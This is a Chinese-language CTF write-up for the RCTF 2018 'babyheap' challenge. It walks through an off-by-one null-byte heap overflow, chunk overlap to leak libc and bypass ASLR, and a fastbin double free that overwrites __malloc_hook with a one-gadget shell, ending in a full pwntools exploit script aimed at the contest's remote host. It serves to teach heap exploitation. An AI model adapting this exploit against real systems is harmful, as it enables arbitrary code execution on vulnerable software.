# RCTF babyheap
## Author: fanda

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>先贴一下**securisecctf队**写的[原wp](https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/)的地址，我在这里配合这篇wp再解析一下。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>拿到二进制文件后常规检查一下，可以看到程序本身所有的保护都开了，而libc有一个没开，这意味这我们有改写libc的GOT表的权限，在这里我们可以修改__malloc_hook。</font></br>

![babyheap1](../../screenshot/babyheap1.png)

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>用IDA打开附带的libc.so.6，搜索字符串，跟踪/bin/sh，可以看到从**0x4526a**地址处开始有调用execve("/bin/sh")，因此这里就是我们用来getshell的gadget了；用'objdump -R libc.so.6 | grep hook'命令得到__malloc_hook的地址:**0x3c3ef0**</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后我们开始分析这个程序，很典型的堆题套路，漏洞点就在alloc的时候，输入堆块内容的时候存在溢出最后一字节的可能性:</font></br>

```C
__int64 __fastcall set_chunk(__int64 chunk, unsigned int size)
{
  char buf; // [sp+13h] [bp-Dh]@2
  unsigned int i; // [sp+14h] [bp-Ch]@1
  __int64 v5; // [sp+18h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  for ( i = 0; i < size; ++i )
  {
    buf = 0;
    if ( read(0, &buf, 1uLL) < 0 )
      put_error((__int64)"read() error");
    *(_BYTE *)(chunk + i) = buf;
    if ( buf == 10 )
      break;
  }
  *(_BYTE *)(i + chunk) = 0;
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>64位下利用off-by-one漏洞需要分配一个MINSIZE-8的大小，（不懂原理的可以先看[这里](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/ "sploitfun")）然后就可以在8字节覆盖完了堆的pre_size后，剩下的溢出的最后一个NULL字节覆盖size的最低地址，抹掉了prev_inuse的标志位，就可以让allcator误以为前面的堆块已经被释放了，触发合并操作，然后配合double-free就可以为所欲为了。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>有了利用思路后，我们首先分配四个堆块，并且尝试泄露libc地址。</font></br>

```python
alloc(0xf0,'A' * 0xf0)#0
alloc(0x70,'A' * 0x70)#1
alloc(0xf0,'A' * 0xf0)#2
alloc(0x30,'A' * 0x30)#3
delete(0)
delete(1)

alloc(0x78,'B' * 0x70 + p64(0x180))#0

delete(2)
alloc(0xf0,'A' * 0xf0)

show(0)
r.recvuntil('content: ')
libc_base = u64(r.recv(6) + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc_base))
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>有一点需要注意的是程序内部记录堆块和内存中真正bins里的记录是不一样的，比如分配完之后链表是这样的:</font></br>

```C
pwndbg> x/10xg 0x511654eb7000
0x511654eb7000:	0x000055f71691e400	0x000055f71691e500
0x511654eb7010:	0x000055f71691e580	0x000055f71691e680
0x511654eb7020:	0x0000000000000000	0x0000000000000000
0x511654eb7030:	0x0000000000000000	0x0000000000000000
0x511654eb7040:	0x0000000000000000	0x0000000000000000
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>释放完了0号和1号堆块之后是这样的：</font></br>

```C
pwndbg> x/10xg 0x511654eb7000
0x511654eb7000:	0x0000000000000000	0x0000000000000000
0x511654eb7010:	0x000055f71691e580	0x000055f71691e680
0x511654eb7020:	0x0000000000000000	0x0000000000000000
0x511654eb7030:	0x0000000000000000	0x0000000000000000
0x511654eb7040:	0x0000000000000000	0x0000000000000000
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后我们重新申请一块0x78(MINSIZE-8)的内存之后实际上分配过来的是原来的1号堆块，但是程序记录时重新将这个堆块标记为0：</font></br>

```C
pwndbg> x/10xg 0x511654eb7000
0x511654eb7000:	0x000055f71691e500	0x0000000000000000
0x511654eb7010:	0x000055f71691e580	0x000055f71691e680
0x511654eb7020:	0x0000000000000000	0x0000000000000000
0x511654eb7030:	0x0000000000000000	0x0000000000000000
0x511654eb7040:	0x0000000000000000	0x0000000000000000
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>如上，这就像是链表中原先1号堆块被放到了0号，不过这么理解不太好。实际上是分别释放完了堆块0和1以后（实际bins是向前插入），内存中bins是：{1，0，...}，然后我们再次申请跟1相同大小的内存块的时候系统会直接返还给之前的堆块给我们也就是堆块1，然而这个堆块1会被程序记录为0。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>好了，废话有点多，接下来我们分配的是MINSZIE-8大小的堆块，所以实际上存在8字节可以覆盖下一个堆块（堆块2）的pre_size，然后NULL byte可以覆盖size的pre_inuse标志，当我们写入0x70*'a'+p64(0x180)的时候，下一个堆块的pre_size被修改为0x180,然后pre_inuse被清除，这就相当于欺骗了malloc以为之前有一个0x180大小的已经被释放的堆块，然后我们delete堆块2，malloc就会把这两个堆块合并起来，就会存在一个0x280的大堆块。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来再分配一个0xf0大小的堆块，会被记录为1号，但是在内存里会被放在1号堆块之前的位置，这时候链表是这样的：</font></br>

```C
pwndbg> x/10xg 0x511654eb7000
0x511654eb7000:	0x000055f71691e500	0x000055f71691e400
0x511654eb7010:	0x0000000000000000	0x000055f71691e680
0x511654eb7020:	0x0000000000000000	0x0000000000000000
0x511654eb7030:	0x0000000000000000	0x0000000000000000
0x511654eb7040:	0x0000000000000000	0x0000000000000000

pwndbg> x/20xg 0x000055f71691e400
0x55f71691e400:	0x4141414141414141	0x4141414141414141
0x55f71691e410:	0x4141414141414141	0x4141414141414141
0x55f71691e420:	0x4141414141414141	0x4141414141414141
0x55f71691e430:	0x4141414141414141	0x4141414141414141
0x55f71691e440:	0x4141414141414141	0x4141414141414141
0x55f71691e450:	0x4141414141414141	0x4141414141414141
0x55f71691e460:	0x4141414141414141	0x4141414141414141
0x55f71691e470:	0x4141414141414141	0x4141414141414141
0x55f71691e480:	0x4141414141414141	0x4141414141414141
0x55f71691e490:	0x4141414141414141	0x4141414141414141
pwndbg> 
0x55f71691e4a0:	0x4141414141414141	0x4141414141414141
0x55f71691e4b0:	0x4141414141414141	0x4141414141414141
0x55f71691e4c0:	0x4141414141414141	0x4141414141414141
0x55f71691e4d0:	0x4141414141414141	0x4141414141414141
0x55f71691e4e0:	0x4141414141414141	0x4141414141414141
0x55f71691e4f0:	0x0000000000000000	0x0000000000000181
0x55f71691e500:	0x00007f1e8aa59b78	0x00007f1e8aa59b78
0x55f71691e510:	0x4242424242424242	0x4242424242424242
0x55f71691e520:	0x4242424242424242	0x4242424242424242
0x55f71691e530:	0x4242424242424242	0x4242424242424242

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来输入0号堆块的内容，就会泄露出main_arena的地址了，再进行一些计算就能算出libc_base的实际地址，绕过ASLR：</font></br>

```C
 0x55f71690f000     0x55f71693f000 rw-p    30000 0      [heap]
 0x7f1e8a695000     0x7f1e8a855000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so

```
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来进行如下操作：</font></br>

```python
delete(1)

alloc(0x10, 'A' * 0x10)#1
alloc(0x60, 'B' * 0x60)#2
alloc(0x60, 'C' * 0x60)#4
# below chunk will be placed on same address as overlapped chunk
alloc(0x60, 'D' * 0x60)#5
# free overlapped chunk address twice
delete(5)
delete(4)
delete(0)
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>释放完了堆块1号（内存实际位置在0号堆块之前），下面三次alloc都会重新返回刚释放的堆块的地址。在第四次alloc的时候，会把0号堆块切割一下返回分配出来，并被设置为5号堆块，这个时候如果我们free堆块5号和堆块0号（为什么可以free堆块0？因为程序并不知情已经被合并到一个大空闲块了，但是链表记录还在:），相当于对同一个堆块free了两次，出现了double free漏洞，这里我们再free一下4号绕过简单的double free检测，然后就可以利用了：</font></br>

```python
fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
oneshot = libc_base + 0x4526a
alloc(0x60, p64(fake_chunk) + p64(0) + "H"*0x50)
alloc(0x60,'A' * 0x60)
alloc(0x60,'A' * 0x60)
alloc(0x60,'A' * 0x13 + p64(oneshot) + "\n")

r.sendlineafter("choice: ", "1")
r.sendlineafter(": ", "1")
r.interactive()
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后就得到shell了，完整脚本如下：</font></br>

Exploit脚本：
=========

```python
from pwn import *

DEBUG = 1

if DEBUG == 1:
  r = process('./babyheap')
  context(log_level='debug')
  gdb.attach(r)
else:
  r = remote('babyheap.2018.teamroir.cn',3154)

def alloc(size, payload):
        r.sendlineafter('choice: ','1')
        r.sendlineafter('please input chunk size: ',str(size))
        r.sendafter('input chunk content: ',payload)
def show(index):
        r.sendlineafter('choice: ','2')
        r.sendlineafter('please input chunk index: ',str(index))
def delete(index):
        r.sendlineafter('choice: ','3')
        r.sendlineafter('please input chunk index: ',str(index))

libc = ELF('./libc.so.6')
alloc(0xf0,'A' * 0xf0)#0
alloc(0x70,'A' * 0x70)#1
alloc(0xf0,'A' * 0xf0)#2
alloc(0x30,'A' * 0x30)#3
delete(0)
delete(1)

alloc(0x78,'B' * 0x70 + p64(0x180))#0

delete(2)
alloc(0xf0,'A' * 0xf0)

show(0)
r.recvuntil('content: ')
libc_base = u64(r.recv(6) + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc_base))

delete(1)

alloc(0x10, 'A' * 0x10)#1
alloc(0x60, 'B' * 0x60)#2
alloc(0x60, 'C' * 0x60)#4
# below chunk will be placed on same address as overlapped chunk
alloc(0x60, 'D' * 0x60)#5
# free overlapped chunk address twice
delete(5)
delete(4)
delete(0)
fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
oneshot = libc_base + 0x4526a
alloc(0x60, p64(fake_chunk) + p64(0) + "H"*0x50)
alloc(0x60,'A' * 0x60)
alloc(0x60,'A' * 0x60) 
alloc(0x60,'A' * 0x13 + p64(oneshot) + "\n")

r.sendlineafter("choice: ", "1")
r.sendlineafter(": ", "1")
r.interactive()

```
